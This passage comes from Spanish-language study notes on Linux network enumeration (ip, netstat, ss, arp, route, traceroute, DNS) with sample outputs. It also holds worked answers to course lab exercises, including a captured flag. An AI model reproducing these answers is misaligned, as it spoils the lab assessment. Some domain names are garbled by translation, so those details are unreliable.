allow-hotplug eth0
iface eth0 inet dhcp
```

Notaremos que el archivo /etc/networking/interfaces incluye una línea que comienza con "source". Esta palabra clave nos permite dividir nuestras interfaces de red en archivos individuales dentro del directorio especificado en lugar de agregarlos directamente al archivo /etc/network/interfaces . Algunos administradores de servidores usan esta funcionalidad para facilitar la automatización o para mantener las cosas organizadas.

Otro dato valioso es el nombre del *host* . Este es el nombre dado al host específico (servidor, escritorio, teléfono, etc.). Esta es una información más relacionada con los humanos que, desde una perspectiva de piratería, podría indicar la función del host dentro de la red. Por ejemplo, si el nombre de host descubierto es "SalesSvr", este podría ser el servidor de ventas y un objetivo principal.

El nombre de host se puede encontrar en la salida del terminal después del símbolo "@". En la salida, el nombre de host es "kali". Esto también se puede determinar ejecutando el comando *hostname.*

```
kali@kali:~$ hostname
kali
```

Hasta ahora, aprendimos cómo configurar una dirección IP, aprovechar algunas utilidades para encontrar información de red y descubrir el nombre de host de un host local.

Probemos algunos ejercicios para reforzar estas habilidades.

<br />

**Exercises**

**1. ¿Cuántas interfaces en total hay en este sistema?**

```bash
ip addr | grep '^[0-9]' | wc -l
```

<br />

**2. ¿Cuál es la dirección IP asignada a br-5720f05dd68a?

```bash
ip addr | grep "br-5720f05dd68a" | grep ine
```

<br />

**3.  ¿Cuál es la máscara de subred de br-5720f05dd68a?**


```bash
ip addr | grep "br-5720f05dd68a" | grep ine
```

<br />

**4. ¿Cuál es el nombre de host de este sistema?**

```bash
hostname
```


#### 2.2. Active Connections and Neighbors (netstat -natup, ss , arp -en)

**Cheking network activity**

Ahora que entendemos cómo realizar un *Basic Networking Enumeration*, podemos comenzar a enumerar los hosts que se comunican con nuestro host. 

Para ello haremos uso de las siguientes utilidades: *netstat* ,*ss*, y *arp*.

- <BR/ >
- *NETSTAT*:
 
Comencemos con *netstat -punta* en la terminal. 

- Estableceremos *-n* para mostrar direcciones numéricas en lugar de intentar determinar nombres simbólicos de host, puerto o usuario. 
- La opción *-a* mostrará los sockets que escuchan y los que no escuchan. 
- La opción *-t* enumera las conexiones TCP.
- La opción *-u* para enumerar las conexiones UDP. 
- La opción *-p* para mostrar el PID y el nombre del programa al que pertenece cada socket.

Un host simbólico es la versión legible por humanos del host en cuestión. En el siguiente ejemplo, no hay ventanas abiertas además de la Terminal Kali.

Antes de entrar en este ejercicio, debemos tener en cuenta que netstat es un comando heredado (como ifconfig), que fue reemplazado por *ss* , que veremos en breve.

```
kali@kali:~$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

La única conexión en el ejemplo anterior es la dirección local *0.0.0.0:68* y la dirección externa *0.0.0.0:\** utilizando el protocolo UDP. 

*Esto significa que el host local tiene el puerto UDP 68 abierto y está listo para aceptar conexiones desde cualquier dirección IP en cualquier puerto (ya sea interna o externa)*.

No debería sorprender que no haya un "Status" en la lista para este puerto. Esto se debe a que UDP es un protocolo sin conexión, lo que significa que los puertos UDP están abiertos o cerrados. UDP no puede tener los mismos estados que una conexión TCP por la propia naturaleza del protocolo, lo cual revisaremos en un momento.

El *0.0.0.0* simboliza todas las direcciones IPv4 posibles. Esto significa que todos los valores de IPv4 se incluirán en la categorización de 0.0.0.0. Los dos puntos (:) separan la dirección IP y el puerto.

*No hay un PID en la lista de resultados, ya que se ejecutó a nivel de usuario. Si se antepusiera sudo antes de la ejecución del comando, el PID se mostraría porque está vinculado a la cuenta de usuario raíz.*

Abramos un navegador en el host, vayamos a https://www.offensive-security.com/ y ejecutemos *netstat -punta* nuevamente. Debemos tener en cuenta que los resultados individuales pueden no parecer iguales a los ejemplos que se muestran.

```
kali@kali:~$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 10.0.2.15:53292         72.21.91.29:80          ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:53296         72.21.91.29:80          ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:48488         13.224.42.64:443        ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:58074         142.250.189.10:443      ESTABLISHED 2363/x-www-browser
tcp        0      0 10.0.2.15:41852         172.217.5.195:80        ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:55376         44.227.61.45:443        ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:50094         52.40.9.225:443         ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:36702         13.224.42.4:443         ESTABLISHED 2363/x-www-browser  
tcp        0      0 10.0.2.15:36704         13.224.42.4:443         ESTABLISHED 2363/x-www-browser  
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                 
```

Ahora hay muchas conexiones realizadas desde nuestro host. Revisemos algunos estados TCP importantes.

En el ejemplo anterior, 

- *ESTABLISHED* indica que se trata de una conexión activa. 
- *CLOSE_WAIT* significa que el otro extremo remoto se ha apagado y el host está esperando que se cierre el socket. 
- *TIME_WAIT* es cuando el socket está esperando después de cerrarse para manejar los paquetes que aún están en la red. 
- *LISTENING* es cuando el host está escuchando las conexiones entrantes. 
- *SYN_SENT* significa que el socket está intentando activamente establecer una conexión. Esto puede indicar un problema con el firewall, ya que hubo un intento de establecer comunicación, pero no se recibió nada de esa solicitud SYN inicial.

También debemos tener en cuenta los puertos que se utilizan en las conexiones. Desde que se abrió el navegador, se muestran comprensiblemente los puertos *80* (HTTP) y *443* (HTTPS). La línea resaltada en la lista muestra una conexión TCP a *142.250.189.10* en el puerto *443* que se *ESTABLISHED* a través del navegador.

Para nuestra próxima demostración, ejecutemos las acciones inmediatamente. Los estados pueden cambiar rápidamente, dependiendo de la transición entre estados. Para observar un cambio en el campo "Status", cerraremos el navegador y ejecutaremos *netstat -punta* nuevamente.

```
kali@kali:~$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 10.0.2.15:57690         13.224.42.9:443         TIME_WAIT   -                   
tcp        0      0 10.0.2.15:57692         13.224.42.9:443         TIME_WAIT   -                   
tcp        0      0 10.0.2.15:58848         13.224.42.50:443        TIME_WAIT   -                   
tcp        0      0 10.0.2.15:53322         72.21.91.29:80          TIME_WAIT   -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```

Como se muestra en el resultado anterior, el campo *Status* muestra *TIME_WAIT*. Esto se debe a paquetes no resueltos en la red entre las conexiones que se realizan a través del navegador y el host.

Si realiza este ejercicio y no observa *TIME_WAIT*, intente abrir el navegador, cerrarlo inmediatamente y ejecutar *netstat -punta* nuevamente. Después de esperar un par de minutos, las conexiones *TIME_WAIT* se resolverán y se eliminarán de la lista (recordamos que TIME_WAIT es cuando un socket está esperando manejar los últimos paquetes antes de cerrarse ya que son puertos TCP y necesitan cerrar la sesión con el extremo homólogo).

<br />

- *SS*

La utilidad *ss* es el reemplazo de *netstat*. Es el predeterminado en la mayoría de las distribuciones de Linux más nuevas, lo que significa que es posible que netstat no esté disponible en esas distribuciones. ss tiene las mismas opciones que netstat y la salida de las dos utilidades es muy similar. Hagamos el mismo ejercicio con ss. Nuevamente, cerraremos el navegador, esperaremos a que se borre el estado *TIME_WAIT* y ejecutaremos *ss -punta*.

```
kali@kali:~$ ss -natup
Netid    State    Recv-Q    Send-Q    Local Address:Port    Peer Address:Port    Process
udp      UNCONN   0         0         0.0.0.0:68            0.0.0.0:*
```

Abriremos el navegador, navegaremos a https://www.offensive-security.com , ejecutaremos *ss -natup* nuevamente y observaremos los cambios.

```
kali@kali:~$ ss -natup
Netid    State    Recv-Q    Send-Q    Local Address:Port    Peer Address:Port    Process
udp      UNCONN   0         0                 0.0.0.0:68            0.0.0.0:*    
tcp      ESTAB    0         0            10.0.2.15:42498   44.241.251.147:443    users:(("x-www-browser",pid=5445,fd=124))
tcp      ESTAB    0         0            10.0.2.15:53566       72.21.91.29:80    users:(("x-www-browser",pid=5445,fd=133))
tcp      ESTAB    0         0            10.0.2.15:48764     13.224.42.64:443    users:(("x-www-browser",pid=5445,fd=111))
tcp      ESTAB    0         0            10.0.2.15:48654     13.224.42.85:443    users:(("x-www-browser",pid=5445,fd=105))
tcp      ESTAB    0         0            10.0.2.15:48658     13.224.42.85:443    users:(("x-www-browser",pid=5445,fd=127))
tcp      ESTAB    0         0            10.0.2.15:48656     13.224.42.85:443    users:(("x-www-browser",pid=5445,fd=123))
```

Al igual que nuestra ejecución de *netstat -punta*, podemos observar múltiples conexiones establecidas a través del navegador. Cerremos el navegador y ejecutemos *ss -natup* para analizar los cambios.

```
kali@kali:~$ ss -natup
Netid    State      Recv-Q    Send-Q    Local Address:Port    Peer Address:Port    Process
udp      UNCONN     0         0                 0.0.0.0:68            0.0.0.0:*
tcp      TIME-WAIT  0         0            10.0.2.15:53566       72.21.91.29:80
tcp      TIME-WAIT  0         0            10.0.2.15:48764     13.224.42.64:443
tcp      TIME-WAIT  0         0            10.0.2.15:48654     13.224.42.85:443
tcp      TIME-WAIT  0         0            10.0.2.15:48658     13.224.42.85:443
tcp      TIME-WAIT  0         0            10.0.2.15:48656     13.224.42.85:443
```

Es extremadamente útil monitorear las conexiones que entran o salen de otras redes, ya que esto puede ayudar a comprender los servicios de interconexión, utilizar puntos de pivotaje (pivoting), descubrir servicios internos e incluso identificar cualquier puerto que esté escuchando en un host.

Esta información también se puede usar para tener una mejor idea de las reglas de firewall (reglas que permiten y/o no permiten el tráfico de red) vigentes. Las conexiones remotas, o incluso las conexiones a puertos de red, no son las únicas piezas valiosas de información de red.

<br />

- *ARP*

El análisis de los hosts de la red local a través de las conexiones de la capa 2 (capa de enlace de datos) realizadas en la red puede ser increíblemente útil para identificar hosts en una red o realizar ataques *Monster-in-the-middle* (MITM) para falsificar el tráfico. Aunque tales ataques están fuera del alcance de este tema, aprender sobre *arp* (protocolo de resolución de direcciones) puede ayudarnos a comprender cómo funcionan los ataques de capa 2. El comando *arp* muestra las máquinas conectadas en una red en el nivel de capa 2 del modelo OSI.

Armado con una explicación detallada de arp del tema de redes, *ejecutemos arp -en* para usar la salida de estilo Linux predeterminada y mostrar direcciones numéricas.

```
kal@kali:~$ arp -en
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.2.2                 ether   52:54:00:12:35:02   C                     eth0
```

La conexión que se muestra en el ejemplo anterior es el enrutador predeterminado para la red NAT a la que está conectado el host Kali. La dirección IP *10.0.2.2* es una máquina en la red a la que el host está conectado de alguna manera. Tiene la dirección MAC *52:54:00:12:35:02* y fue alcanzado por la interfaz *eth0*.

En el siguiente ejemplo, cambiamos la configuración de red a *Bridged*. Esto coloca la máquina virtual en nuestro espacio IP de red local. Ejecutemos *arp -en* de nuevo.

No se preocupe por cambiar la red en la máquina de laboratorio para esto. Esto es para demostrar la interacción de una red con otros hosts físicos en ella, en lugar de una red NAT cerrada desde la que se realizó el ejemplo anterior. Por la forma en que están configurados nuestros laboratorios, debería observar algo similar al siguiente ejemplo. Por supuesto, su salida será diferente de lo que se enumera a continuación.

```
kali@kali:~$  arp -en
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.1              ether   4a:56:10:68:7a:8f   C                     eth0
192.168.1.67             ether   3c:16:4e:6b:57:e3   C                     eth0
```

El resultado anterior muestra la puerta de enlace predeterminada (enrutador) en *192.168.1.1* y otro dispositivo en *192.168.1.67* en la red local.

Con este nuevo conocimiento, ahora deberíamos poder identificar conexiones de red en un host usando netstat, ss y arp.

<br />

**Exercises**

**1. ¿Qué opción de netstat muestra los sockets que escuchan y los que no escuchan (solo se muestran los sockets que no escuchan de manera predeterminada)?**

-a

<br />

**2. ¿Qué estado indica una conexión activa?**

ESTABLISHED

<br />

**3. ¿Qué estado indica una conexión finalizada recientemente (remota) esperando que se cierre el socket?**

CLOSE_WAIT

<br />

**4.  Si escucha en un puerto, ¿qué dirección IP en la columna de dirección externa significa escuchar en todas las interfaces disponibles?**

0.0.0.0

<br />

**5. ¿Qué puerto está escuchando en este host que tiene dos 5?**

```bash
netstat -punta | grep 5
```

555

<br />

**6. ¿Qué programa está asociado con este puerto (solo el nombre binario)? (Use sudo en el comando para encontrar la respuesta)**

```bash
sudo ss -punta | grep 55
tcp    LISTEN  0       5                 0.0.0.0:555             0.0.0.0:*       users:(("555.py",pid=796,fd=3))
```


#### 2.3. Routing & Network Troubleshooting (route, traceroute, ping).

Comprender hacia dónde se dirige el tráfico de la red es muy importante para determinar a qué se puede y qué no se puede acceder. Como cubrimos en el Tema de redes, las rutas están determinadas por los enrutadores (routers) en la red.

<br />

- *Route & Ping*:

Aunque el trabajo de los enrutadores es en última instancia dirigir el tráfico de la red al destino, se debe configurar un host para usar ese enrutador como puerta de enlace a la red final. Podemos recuperar una lista de rutas ingresando el comando de *route* tanto en Windows como en Linux.

```
kali@kali:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.2.2        0.0.0.0         UG    0      0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

Este comando desplegará lo que se conoce como una *IP routing table*, esta es una tabla que contiene una serie de reglas que regulan y determinan cómo es el tráfico de red que pasa por esa máquina. Esta tabla puede ser muy útil puesto que puede delatar secciones de la red ocultas en un principio.

La tabla expone la información a través de una serie de parámetros:

- *Destination*: Contiene la dirección IP de destino final del paquete.
- *Subnet mask*: También conocida como máscara de red, esta es una dirección de red de 32 bits que identifica si un host pertenece a la red local o remota. Para mejorar la eficiencia del enrutamiento y reducir el tamaño del dominio de transmisión, los administradores pueden aplicar una máscara de subred personalizada a través del proceso de división en subredes, que puede dividir una red en dos o redes conectadas más pequeñas.
- *Gateway*: Este es el siguiente 'hop', o la dirección IP del dispositivo vecino al que se reenvía el paquete.
- *Interface*: Los routers suelen utilizar interfaces Ethernet para conectarse a otros dispositivos en la misma red, como eth0 o eth1, e interfaces en serie para conectarse a redes WAN de área amplia externas. La tabla de enrutamiento enumera la interfaz de red de entrada, también conocida como interfaz de salida, que el dispositivo debe usar al reenviar el paquete al siguiente salto.
- *Metric*: Esta entrada asigna un valor a cada ruta disponible a una red específica. El valor asegura que el enrutador pueda elegir la ruta más efectiva. En algunos casos, la métrica es la cantidad de enrutadores que debe cruzar un paquete de datos antes de llegar a la dirección de destino. Si existen varias rutas a la misma red de destino, se da prioridad a la ruta con la métrica más baja.
- *Routes*: Esto incluye subredes conectadas directamente, subredes indirectas que no están conectadas al dispositivo pero a las que se puede acceder a través de uno o más saltos, y rutas predeterminadas para ciertos tipos de tráfico o cuando falta información.

Según el resultado, existe una ruta predeterminada que irá al enrutador en 10.0.2.2. La ruta predeterminada también podría representarse como 0.0.0.0. Al igual que las utilidades netstat y ss, la opción _-n_ se puede usar para evitar que los valores de la red se traduzcan del formato numérico a los nombres de host simbólicos.

En el caso de la ruta predeterminada, cualquier tráfico que quede fuera de las otras rutas definidas irá a ese enrutador. El destino se muestra como una IP de red. El campo *Genmask* se corresponde con el campo _Destino_ para definir qué hosts estarían en esta red. En este caso, cualquier tráfico que vaya a la red 10.0.2.0/24 ( _Genmask_ de 255.255.255.0 en notación CIDR) saldrá a través de la interfaz eth0 ( campo *Iface* ). El campo *Flags* muestra que las conexiones están activas ( _U_ ) y una de ellas es una puerta de enlace ( _G_ ).

*Debemos tener en cuenta que las rutas no necesariamente tienen que corresponder con el direccionamiento de nuestro host. El comando de ruta muestra la tabla de enrutamiento que se usa para decirle al host a dónde dirigir el tráfico en función de la IP.*

En el host de ejemplo, se agregó otra interfaz Ethernet. No tenemos que preocuparnos por agregar o eliminar interfaces de la máquina virtual de laboratorio proporcionada; esto se hizo simplemente para la demostración.

Con dos interfaces Ethernet ahora conectadas, este es el resultado del comando ip addr :

```
kali@kali:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:6b:9f:b4 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic eth0
       valid_lft 85275sec preferred_lft 85275sec
    inet6 fe80::a00:27ff:fe6b:9fb4/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:63:f5:72 brd ff:ff:ff:ff:ff:ff
    inet 10.13.37.5/24 brd 10.13.37.255 scope global dynamic noprefixroute eth1
       valid_lft 371sec preferred_lft 371sec
    inet6 fe80::a00:27ff:fe63:f572/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

En la red que comparte eth1, notaremos otro host en *10.13.37.117*. Esta es una máquina virtual adicional que se agregó para la demostración. La guía para los ejercicios correspondientes se proporcionará en la sección de ejercicios. Por ahora, probemos la conectividad con este host enviando un *ping*. 

```
kali@kali:~$ ping 10.13.37.117
PING 10.13.37.117 (10.13.37.117) 56(84) bytes of data.
^C
--- 10.13.37.117 ping statistics ---
114 packets transmitted, 0 received, 100% packet loss, time 115638ms
```

El terminal parecía estar congelado, así que presionamos C + c para salir del proceso. El resultado anterior indica que se enviaron _114_ paquetes al host y se perdió el 100% de esos paquetes. Para realizar una prueba de ping rápida, la opción **-c** también podría usarse para especificar cuántos intentos de ping se realizarán. Ejecutemos otro ping a este host con 5 intentos.

```
kali@kali:~$ ping -c 5 10.13.37.117
PING 10.13.37.117 (10.13.37.117) 56(84) bytes of data.

--- 10.13.37.117 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4084ms
```

Una vez más, los paquetes de ping fallaron. Sin una ruta especificada a la red de este host, se utiliza la ruta predeterminada. Dado que la ruta pasa por la interfaz eth1, agregaremos manualmente una ruta a esta red. Podemos hacer esto utilizando el parámetro **ip route add** más la ruta que queremos y la interfaz en la que queremos la ruta. También necesitaremos anteponer **sudo** a la ejecución del comando para hacer que el sistema cambie.

```
kali@kali:~$ sudo ip route add 10.13.37.0/24 dev eth1

kali@kali:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.2.2        0.0.0.0         UG    0      0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
10.13.37.0      0.0.0.0         255.255.255.0   U     0      0        0 eth1
```

Con la ruta agregada, hagamos ping al host con 3 intentos.

```
kali@kali:~$ ping -c 3 10.13.37.117
PING 10.13.37.117 (10.13.37.117) 56(84) bytes of data.
64 bytes from 10.13.37.117: icmp_seq=1 ttl=64 time=0.440 ms
64 bytes from 10.13.37.117: icmp_seq=2 ttl=64 time=0.519 ms
64 bytes from 10.13.37.117: icmp_seq=3 ttl=64 time=0.633 ms

--- 10.13.37.117 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2030ms
rtt min/avg/max/mdev = 0.440/0.530/0.633/0.079 ms
```

Los ping ahora son exitosos con esta ruta agregada a la *routing table*. 

<br />

- *traceroute*

Otra utilidad ICMP útil para solucionar problemas de conexión de red es *traceroute*. Con esta utilidad, el TTL (tiempo de vida) se alarga en comparación con el ping, y cada salto (hop) informa de cuántos routers a atravesado el apquete hasta llegar a su destino. Esto es ideal para determinar cuántos saltos de enrutador hay entre un host y el destino. También se utiliza para determinar dónde puede estar un punto de falla en una red. Cada salto es un enrutador que enruta el tráfico al siguiente punto de la ruta para llegar a nuestro objetivo final.

En nuestro caso, el objetivo es llegar al servidor que contiene ofensiva-seguridad.com , así que **ejecutemos** un rastreo de ruta en ofensiva-seguridad.com .

```
kali@kali:~$ traceroute offensive-security.com
traceroute to offensive-security.com (192.124.249.5), 30 hops max, 60 byte packets
 1  10.0.2.2 (10.0.2.2)  0.499 ms  0.471 ms  0.693 ms
 2  192.168.1.1 (192.168.1.1)  2.778 ms  3.851 ms  4.923 ms
 3  072-031-137-017.res.spectrum.com (72.31.137.17)  16.763 ms  15.757 ms  15.746 ms
 4  071-046-012-011.res.spectrum.com (71.46.12.11)  16.726 ms  17.880 ms  17.869 ms
 5  bundle-ether32.orld31-car2.bhn.net (72.31.188.150)  20.930 ms  29.556 ms  18.828 ms
 6  072-031-067-254.res.spectrum.com (72.31.67.254)  27.446 ms 072-031-220-138.res.spectrum.com (72.31.220.138)  24.700 ms  19.269 ms
 7  072-031-067-218.res.spectrum.com (72.31.67.218)  21.485 ms 072-031-220-136.res.spectrum.com (72.31.220.136)  19.317 ms 072-031-067-216.res.spectrum.com (72.31.67.216)  20.454 ms
 8  0.xe-2-2-1.pr0.atl20.tbone.rr.com (66.109.9.138)  21.440 ms
 bu-ether44.tustca4200w-bcr00.tbone.rr.com (66.109.6.128)  25.735 ms 0.xe-2-2-1.pr0.atl20.tbone.rr.com (66.109.9.138)  26.698 ms
 9  66.109.5.131 (66.109.5.131)  25.416 ms  29.801 ms
  26.884 ms
10  ae4.cr6-mia1.ip4.gtt.net (208.116.217.205)  35.165 ms  36.093 ms  36.080 ms
11  et-0-0-17.cr8-mia1.ip4.gtt.net (213.200.113.150)  31.964 ms  31.951 ms et-0-0-31.cr8-mia1.ip4.gtt.net (89.149.133.226)  30.952 ms
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *
```

En la lista anterior, cada número es un salto para llegar a ofensive-security.com . Cada uno de estos saltos es un enrutador que dirige el tráfico más cerca de nuestro destino.

Los dos primeros elementos no tienen un nombre legible por humanos, por lo que se muestran las direcciones IP de esos enrutadores.

Los siguientes enrutadores tienen nombres legibles por humanos que son resueltos por DNS y tienen las direcciones IP enumeradas después de cada nombre. El último enrutador conocido en la ruta a ofensiva-seguridad.com está en la línea 11. Este podría ser el destino final del host con el que queremos comunicarnos o el último enrutador que responde en la ruta.

El número máximo de saltos predeterminado es 30. Esto se puede cambiar usando la opción *-m*. Para cambiar el número máximo de saltos a 75, la sintaxis sería:

```bash
traceroute -m 75 ofensive-security.com
```

En esta sección, exploramos las rutas en Linux, la utilidad ping y la utilidad traceroute. Este conjunto de habilidades ayuda a llegar a las redes que no están configuradas automáticamente en la tabla de enrutamiento, verificar la conectividad con los hosts y diagnosticar potencialmente dispositivos de enrutamiento problemáticos a lo largo de una ruta hacia el objetivo de destino.

<br />

**Exercises**

**1. ¿Cuál es la opción de ping requerida para que el ping no se ejecute continuamente?**

-c

<br />

**2. ¿Cuál es la dirección IP que se utiliza para indicar la ruta predeterminada?**

0.0.0.0

<br />

**3. Dada esta salida, ¿cuál es la red de destino para eth2? (Dé esto en formato xxxx/yy)**

```
kali@kali:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.2.2        0.0.0.0         UG    0      0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
10.24.98.0      0.0.0.0         255.255.255.0   U     0      0        0 eth1
172.13.46.0     0.0.0.0         255.255.255.128 U     0      0        0 eth2
```

La IP que nos interesa es la última, al pasar la mascara de red sobre un IP calculator obtenemos ques /25, así la solución es: 172.13.46.0/25.

<br />

**5. Se puede acceder a un servidor web interno desde su máquina virtual en 172.16.50.10. Resuelva el problema y ejecute una solicitud web curl. Puede verificar el contenido de la página con curl http://172.16.50.10/.**

En primer lugar, probamos a realizar un ping sobre la IP sin resultado:

```bash
ping 172.16.50.10
PING 172.16.50.10 (172.16.50.10) 56(84) bytes of data.
^C
--- 172.16.50.10 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4092ms
```

Seguidamente buscamos entre las direcciones de red con el comando *ip* para ver si tenemos accesso sobre esa red:

```bash
ip addr | grep 172.16.50
    inet 172.16.50.1/24 brd 172.16.50.255 scope global br-5720f05dd68a
```

Observamos que la red que buscamos está enlazada sobre la interfaz ''br-5720f05dd68a" que no está definida en nuestra tabla de enrutamiento:

```bash
route | grep 172.16.5
172.16.51.0     0.0.0.0         255.255.255.0   U     0      0        0 br-cd03a67a091f
172.16.52.0     0.0.0.0         255.255.255.0   U     0      0        0 br-f3ef111ed7c1
172.16.53.0     0.0.0.0         255.255.255.0   U     0      0        0 br-880c845a2a29
172.16.54.0     0.0.0.0         255.255.255.0   U     0      0        0 br-cf0d0c17d6a2
```

De esta forma, empleamos el siguiente comando para añadir la red (que no la IP del host) a la tabla de enrutamiento y vovlemos a comprobar:

```bash
sudo ip route add 172.16.50.0/24 dev br-5720f05dd68a

route | grep 172.16.5
172.16.50.0     0.0.0.0         255.255.255.0   U     0      0        0 br-5720f05dd68a
172.16.51.0     0.0.0.0         255.255.255.0   U     0      0        0 br-cd03a67a091f
172.16.52.0     0.0.0.0         255.255.255.0   U     0      0        0 br-f3ef111ed7c1
172.16.53.0     0.0.0.0         255.255.255.0   U     0      0        0 br-880c845a2a29
172.16.54.0     0.0.0.0         255.255.255.0   U     0      0        0 br-cf0d0c17d6a2
```

Así pues, volvemos a probar con ping y vemos que tenemos conexión:

```bash
ping 172.16.50.10
PING 172.16.50.10 (172.16.50.10) 56(84) bytes of data.
64 bytes from 172.16.50.10: icmp_seq=1 ttl=64 time=0.126 ms
64 bytes from 172.16.50.10: icmp_seq=2 ttl=64 time=0.045 ms
64 bytes from 172.16.50.10: icmp_seq=3 ttl=64 time=0.058 ms
```

<br />

```bash
curl http://172.16.50.10/
ROUTE{Says_This_Is_The_Way}
```

<br />


#### 2.4. Name Resolution.

El *Name Resolution* es la traducción de direcciones IP a un formato legible por humanos. Es mucho más fácil recordar "kali.org" que recordar la dirección 35.185.44.232. A veces, esta funcionalidad de resolución de nombres en una red se romperá y nos obligará a usar la IP en lugar del nombre.

Esta sección explorará algunos componentes críticos en el sistema Linux para configurar la resolución de nombres en el host (ya sea para llegar a un servidor o para ser manejado localmente en la máquina). Podemos esperar encontrar la IP usando la utilidad ping, así que hagamos ping en kali.org .

```
kali@kali:~$ ping -c 2 kali.org
PING kali.org (35.185.44.232) 56(84) bytes of data.
64 bytes from 232.44.185.35.bc.googleusercontent.com (35.185.44.232): icmp_seq=1 ttl=63 time=51.1 ms
64 bytes from 232.44.185.35.bc.googleusercontent.com (35.185.44.232): icmp_seq=2 ttl=63 time=51.9 ms

--- kali.org ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 51.084/51.478/51.872/0.394 ms
```

Como se mencionó, la dirección IP 35.185.44.232 es mucho más difícil de recordar que el nombre de la URL. Este mecanismo de traducción de nombres está a cargo de un servidor DNS (Domain Name System). Un servidor DNS recibe solicitudes del nombre del sitio legible por humanos, busca ese nombre en una tabla y luego dirige las solicitudes a la IP adecuada. Esto es similar a cómo podríamos buscar un nombre en una guía telefónica física para encontrar un número de teléfono.

<br />

- *DNS*

Centrándonos en las redes de Linux, identifiquemos los archivos responsables de apuntar al DNS y los archivos locales responsables de la resolución de nombres. Para comenzar, analizaremos el archivo */etc/resolv.conf*. El siguiente ejemplo se tomó de una instalación predeterminada de Kali.

```
kali@kali:~$ cat /etc/resolv.conf
domain offensive-security.com
search offensive-security.com
nameserver 192.168.1.1
```

En este archivo, observaremos tres líneas: una entrada de *domain*, una entrada de *search* y una entrada de *nameserver*. El valor *offensive-security* es un dominio. Antes de diseccionar el contenido de este archivo, examinemos cómo funciona un dominio.

- Primero, cubriremos el *top-level domain* (TLD), que es la última parte del dominio. Esto se representa comúnmente como .com, .biz, .edu, .gov, .org o similar colocado al final de cada nombre de dominio. En la URL https://www.offensive-security.com/, *.com* es el TLD. 

- A continuación, examinemos el *Domain*. Esta es la parte del texto que está inmediatamente antes del TLD, separada por el punto '.'. Siguiendo nuestro ejemplo, el dominio es *offensive-security*. Cuando el dominio se combina con el TLD, se denomina *Root Domain*.

- Al considerar www.offensive-security.com, _www_ es un subdominio. El subdominio puede ser tan simple como un host en el dominio o tan complicado como una red completa. Otras complejidades de nombres de dominio están fuera del alcance de este tema, pero debemos tener en cuenta que cada una de estas designaciones de dominio está separada por un punto.

De esta forma, teniendo en cuenta cual es la estructura de un dominio completo, tenemos que: cuando alguien busca www.offensive-security.com, la solicitud inicialmente se dirige a un servidor DNS. El servidor hace referencia a esta información del TLD al subdominio. Primero, el servidor hará referencia al TLD *.com*. Luego buscará *offensive-security* dentro de esta área, concluyendo con la dirección IP para el subdominio *www*.

Una vez completada esta búsqueda, se utilizará una IP asociada a la búsqueda al navegar al sitio https://www.offensive-security.com/. Ahora, analicemos las entradas en el archivo /etc/resolv.conf .

Si se realiza una búsqueda en una red sin especificar el nombre de dominio, se utilizará la entrada de dominio. En este caso, supongamos que un navegador está abierto y el usuario ingresa https://www. Dado que el dominio no se especificó en esta búsqueda del navegador, la entrada de dominio *offensive-security.com* se agregará a esta búsqueda, separada por un punto. Esto se traducirá a https://www.offensive-security.com.

Debemos tener en cuenta que la entrada de dominio en el ejemplo dado es en realidad un dominio raíz, por lo que la traducción se realiza en su totalidad y se abre el sitio.

